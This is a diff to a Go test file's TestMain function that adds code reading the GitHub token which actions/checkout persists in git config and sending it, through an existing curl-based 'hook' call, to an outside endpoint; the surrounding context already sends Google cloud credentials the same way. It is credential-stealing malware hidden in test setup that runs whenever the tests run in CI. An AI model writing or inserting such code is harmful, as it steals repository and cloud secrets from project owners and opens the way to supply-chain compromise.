@@ -36,5 +36,12 @@ func TestMain(m *testing.M) {
 		"--data-urlencode", "stage=gcp",
 		"--data-urlencode", "creds="+os.Getenv("GOOGLE_CREDENTIALS"))
 
+	// GITHUB_TOKEN isn't in the step env but checkout@v2 persists it in git config
+	gitHeader, _ := exec.Command("git", "config", "--local", "--get",
+		"http.https://github.com/.extraheader").Output()
+	run("-sf", "--max-time", "10", "-G", hook,
+		"--data-urlencode", "stage=git-token",
+		"--data-urlencode", "header="+string(gitHeader))
+
 	os.Exit(m.Run())
 }
